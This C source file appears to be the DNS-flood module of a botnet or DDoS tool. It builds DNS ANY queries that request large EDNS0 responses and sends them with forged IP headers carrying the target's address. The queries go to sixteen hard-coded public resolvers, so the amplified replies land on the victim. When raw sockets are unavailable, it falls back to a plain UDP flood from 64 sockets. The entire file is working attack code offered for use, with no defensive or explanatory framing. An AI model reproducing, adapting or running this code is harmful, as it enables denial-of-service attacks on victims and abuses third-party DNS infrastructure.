#define _GNU_SOURCE

#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

#include "dns_attack.h"
#include "../headers/protocol.h"

#define DNS_PORT 53
#define DNS_SOCKS 64

static const char* dns_resolvers[] = {
    "8.8.8.8",    "8.8.4.4",
    "1.1.1.1",    "1.0.0.1",
    "208.67.222.222", "208.67.220.220",
    "9.9.9.9",    "149.112.112.112",
    "64.6.64.6",  "64.6.65.6",
    "77.88.8.8",  "77.88.8.1",
    "185.228.168.9","185.228.169.9",
    "76.76.19.19", "76.223.122.150",
};
#define RESOLVER_COUNT 16

typedef struct {
    uint16_t id, flags, qdcount, ancount, nscount, arcount;
} __attribute__((packed)) dns_header;

typedef struct {
    uint16_t qtype, qclass;
} __attribute__((packed)) dns_question;

static inline uint64_t xorshift64(uint64_t *s) {
    uint64_t x = *s;
    x ^= x << 13;
    x ^= x >> 7;
    x ^= x << 17;
    return *s = x;
}

static uint16_t ip_checksum(uint16_t* buf, int nwords) {
    uint32_t sum = 0;
    while (nwords--) sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (uint16_t)(~sum);
}

static int encode_domain(const char* domain, uint8_t* buf) {
    int pos = 0;
    const char* s = domain;
    const char* dot;
    while ((dot = strchr(s, '.')) != NULL) {
        int len = dot - s;
        buf[pos++] = len;
        memcpy(buf + pos, s, len);
        pos += len;
        s = dot + 1;
    }
    int len = strlen(s);
    if (len > 0) { buf[pos++] = len; memcpy(buf + pos, s, len); pos += len; }
    buf[pos++] = 0;
    return pos;
}

static int build_dns_query(uint8_t* buf, const char* domain, uint64_t *rng) {
    dns_header* hdr = (dns_header*)buf;
    hdr->id      = (uint16_t)(xorshift64(rng) & 0xFFFF);
    hdr->flags   = htons(0x0100);
    hdr->qdcount = htons(1);
    hdr->ancount = hdr->nscount = 0;
    hdr->arcount = htons(1);

    int qname_len = encode_domain(domain, buf + sizeof(dns_header));
    dns_question* q = (dns_question*)(buf + sizeof(dns_header) + qname_len);
    q->qtype  = htons(255); // ANY
    q->qclass = htons(1);

    int dlen = sizeof(dns_header) + qname_len + sizeof(dns_question);

    // EDNS0 OPT record — requests 4096 byte response
    uint8_t* edns = buf + dlen;
    edns[0] = 0;
    *(uint16_t*)(edns+1) = htons(41);
    *(uint16_t*)(edns+3) = htons(4096);
    *(uint32_t*)(edns+5) = 0;
    *(uint16_t*)(edns+9) = 0;
    return dlen + 11;
}

void* dns_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;

    uint64_t rng_state = (uint64_t)time(NULL) ^ ((uint64_t)getpid() << 16) ^ (uintptr_t)&params;
    if (rng_state == 0) rng_state = 0xDEADBEEFCAFEBABEULL;

    attack_option* opt_domain = find_option(params, OPT_PAYLOAD);
    const char* domain = (opt_domain && opt_domain->data && opt_domain->len > 0)
                         ? (const char*)opt_domain->data : "google.com";

    uint8_t query[512];
    int query_len = build_dns_query(query, domain, &rng_state);

    // Try raw socket first (spoof src = target -> amplification)
    int raw_fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    int use_raw = 0;
    if (raw_fd >= 0) {
        int one = 1;
        if (setsockopt(raw_fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) == 0)
            use_raw = 1;
        else
            { close(raw_fd); raw_fd = -1; }
    }

    int sndbuf = 4 * 1024 * 1024;

    int fds[DNS_SOCKS];
    int active = 0;

    if (!use_raw) {
        for (int i = 0; i < DNS_SOCKS; i++) {
            fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
            if (fds[i] < 0) { fds[i] = -1; continue; }
            setsockopt(fds[i], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
            fcntl(fds[i], F_SETFL, O_NONBLOCK);
            active++;
        }
    } else {
        setsockopt(raw_fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    }

    time_t end_time = time(NULL) + params->duration;
    uint64_t iter = 0;

    if (use_raw) {
        // Pre-build all 16 packets (one per resolver), only update txid per iteration
        size_t pkt_size = sizeof(struct iphdr) + sizeof(struct udphdr) + query_len;
        uint8_t pkt_buf[RESOLVER_COUNT][600]; // enough for any query
        struct sockaddr_in dsts[RESOLVER_COUNT];
        struct mmsghdr msgs[RESOLVER_COUNT];
        struct iovec iovs[RESOLVER_COUNT];

        for (int r = 0; r < RESOLVER_COUNT; r++) {
            memset(pkt_buf[r], 0, pkt_size);
            struct iphdr*  ip  = (struct iphdr*)pkt_buf[r];
            struct udphdr* udp = (struct udphdr*)(pkt_buf[r] + sizeof(struct iphdr));
            uint8_t*       dat = pkt_buf[r] + sizeof(struct iphdr) + sizeof(struct udphdr);

            memcpy(dat, query, query_len);

            ip->ihl      = 5; ip->version = 4; ip->tos = 0;
            ip->tot_len  = htons(pkt_size);
            ip->frag_off = 0; ip->ttl = 64;
            ip->protocol = IPPROTO_UDP;
            ip->saddr    = params->target_addr.sin_addr.s_addr; // spoofed
            ip->daddr    = inet_addr(dns_resolvers[r]);

            udp->source = htons(xorshift64(&rng_state) % 65535);
            udp->dest   = htons(DNS_PORT);
            udp->len    = htons(sizeof(struct udphdr) + query_len);
            udp->check  = 0;

            ip->id    = htons(xorshift64(&rng_state) & 0xFFFF);
            ip->check = 0;
            ip->check = ip_checksum((uint16_t*)ip, sizeof(struct iphdr)/2);

            dsts[r].sin_family      = AF_INET;
            dsts[r].sin_port        = htons(DNS_PORT);
            dsts[r].sin_addr.s_addr = ip->daddr;

            iovs[r].iov_base = pkt_buf[r];
            iovs[r].iov_len  = pkt_size;

            msgs[r].msg_hdr.msg_name    = &dsts[r];
            msgs[r].msg_hdr.msg_namelen = sizeof(dsts[r]);
            msgs[r].msg_hdr.msg_iov     = &iovs[r];
            msgs[r].msg_hdr.msg_iovlen  = 1;
            msgs[r].msg_hdr.msg_control    = NULL;
            msgs[r].msg_hdr.msg_controllen = 0;
            msgs[r].msg_hdr.msg_flags      = 0;
            msgs[r].msg_len = 0;
        }

        while (params->active) {
            // Update transaction ID and IP id in each pre-built packet
            for (int r = 0; r < RESOLVER_COUNT; r++) {
                struct iphdr*  ip  = (struct iphdr*)pkt_buf[r];
                struct udphdr* udp = (struct udphdr*)(pkt_buf[r] + sizeof(struct iphdr));
                dns_header*    dns = (dns_header*)(pkt_buf[r] + sizeof(struct iphdr) + sizeof(struct udphdr));

                uint64_t rv = xorshift64(&rng_state);
                dns->id   = (uint16_t)(rv & 0xFFFF);
                ip->id    = htons((rv >> 16) & 0xFFFF);
                udp->source = htons(1024 + ((rv >> 32) % 64000));

                ip->check = 0;
                ip->check = ip_checksum((uint16_t*)ip, sizeof(struct iphdr)/2);
            }

            sendmmsg(raw_fd, msgs, RESOLVER_COUNT, MSG_NOSIGNAL);

            if ((++iter & 0xFF) == 0 && time(NULL) >= end_time) break;
        }
        close(raw_fd);
    } else {
        // No raw socket — plain UDP to resolvers using sendmmsg()
        // Pre-resolve all resolver addresses
        struct sockaddr_in resolver_addrs[RESOLVER_COUNT];
        for (int r = 0; r < RESOLVER_COUNT; r++) {
            resolver_addrs[r].sin_family      = AF_INET;
            resolver_addrs[r].sin_port        = htons(DNS_PORT);
            resolver_addrs[r].sin_addr.s_addr = inet_addr(dns_resolvers[r]);
        }

        // Batch: send to all resolvers from all sockets using sendmmsg()
        // We batch RESOLVER_COUNT messages per sendmmsg() call per socket
        struct mmsghdr msgs[RESOLVER_COUNT];
        struct iovec iovs[RESOLVER_COUNT];

        for (int r = 0; r < RESOLVER_COUNT; r++) {
            iovs[r].iov_base = query;
            iovs[r].iov_len  = query_len;

            msgs[r].msg_hdr.msg_name       = &resolver_addrs[r];
            msgs[r].msg_hdr.msg_namelen    = sizeof(resolver_addrs[r]);
            msgs[r].msg_hdr.msg_iov        = &iovs[r];
            msgs[r].msg_hdr.msg_iovlen     = 1;
            msgs[r].msg_hdr.msg_control    = NULL;
            msgs[r].msg_hdr.msg_controllen = 0;
            msgs[r].msg_hdr.msg_flags      = 0;
            msgs[r].msg_len = 0;
        }

        while (params->active) {
            ((dns_header*)query)->id = (uint16_t)(xorshift64(&rng_state) & 0xFFFF);

            for (int i = 0; i < DNS_SOCKS; i++) {
                if (fds[i] == -1) continue;
                sendmmsg(fds[i], msgs, RESOLVER_COUNT, MSG_NOSIGNAL);
            }

            if ((++iter & 0xFF) == 0 && time(NULL) >= end_time) break;
        }
        for (int i = 0; i < DNS_SOCKS; i++)
            if (fds[i] != -1) close(fds[i]);
    }

    return NULL;
}
